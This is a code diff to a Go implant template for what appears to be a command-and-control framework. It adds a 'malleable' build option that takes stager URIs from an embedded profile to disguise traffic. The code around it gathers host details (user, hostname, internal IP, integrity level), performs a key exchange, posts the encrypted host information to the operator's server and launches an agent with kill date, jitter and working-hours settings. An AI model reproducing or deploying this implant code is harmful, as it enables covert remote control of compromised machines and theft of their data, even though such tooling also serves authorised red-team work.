@@ -38,7 +38,7 @@ func getSysinfo(server string, nonce string) string {
 	}
 	highIntegrity := fmt.Sprintf("%t", hi)
 
-	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s",
+	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s|",
 		nonce, server, "", username, hostname, internalIP, osDetails, highIntegrity, processName, processID,
 		language, version, architecture)
 }
@@ -108,6 +108,17 @@ func main() {
 	agent_private_cert_key_encoded := "{{ AGENT_PRIVATE_CERT_KEY }}"
 	agent_public_cert_key_encoded := "{{ AGENT_PUBLIC_CERT_KEY }}"
 	server_public_cert_key_encoded := "{{ SERVER_PUBLIC_CERT_KEY }}"
+{% if MALLEABLE %}
+	// Malleable build (`-tags malleable`): parse the JSON profile up front
+	// so we can source the stager URIs from it. Plain builds skip this and
+	// the comms/malleable.go file is excluded from compilation entirely.
+	malleableProfileB64 := "{{ MALLEABLE_PROFILE }}"
+	malleableProfile, _ := comms.ParseMalleableProfile(malleableProfileB64)
+	stage1URI, stage2URI := comms.ResolveStagerURIs(malleableProfile)
+{% else %}
+	stage1URI := "/stage1"
+	stage2URI := "/stage2"
+{% endif %}
 
 	agent_private_cert_key, err := base64.StdEncoding.DecodeString(agent_private_cert_key_encoded)
 
@@ -134,7 +145,7 @@ func main() {
 		return
 	}
 
-	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchange(server, sessionID, stagingKey, agent_private_cert_key, agent_public_cert_key, server_public_cert_key)
+	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchange(server, stage1URI, sessionID, stagingKey, agent_private_cert_key, agent_public_cert_key, server_public_cert_key)
 	if err != nil {
 		fmt.Println("Error performing DH key exchange:", err)
 		return
@@ -165,10 +176,17 @@ func main() {
 
 	// Build and send routing packet for Stage 2
 	routingPacket := packetHandler.BuildRoutingPacket(stagingKey, sessionID, 3, 0, encryptedSysInfo)
-	postURL := server + "/stage2"
+	postURL := server + stage2URI
 	_, _ = http.Post(postURL, "application/octet-stream", bytes.NewReader(routingPacket))
-
-	messagesender, err := comms.NewHttpMessageSender(server, make(map[string]string), profile)
+{% if MALLEABLE %}
+	messagesender, err := comms.NewMalleableHttpMessageSender(server, make(map[string]string), profile, malleableProfileB64)
+	if err != nil {
+		fmt.Println("Error building message sender:", err)
+		return
+	}
+{% else %}
+	messagesender := comms.NewHttpMessageSender(server, make(map[string]string), profile)
+{% endif %}
 
 	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, sessionKey, defaultResponse)
 
